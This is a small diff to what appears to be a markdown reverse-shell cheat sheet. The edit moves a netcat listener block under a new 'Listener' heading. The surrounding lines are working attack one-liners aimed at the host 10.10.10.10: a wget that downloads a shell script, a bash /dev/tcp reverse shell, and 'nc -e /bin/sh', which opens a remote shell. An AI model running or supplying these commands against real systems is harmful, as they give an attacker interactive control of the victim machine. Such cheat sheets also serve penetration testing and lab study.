@@ -73,15 +73,13 @@ wget http://10.10.10.10:8888/something.sh -O something.sh
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
-```
-nc -lvp 4444
-```
-
 ### With netcat
 
 ```
 nc -e /bin/sh 10.10.10.10 4444
 ```
+
+### Listener
 
 ```
 nc -lvp 4444
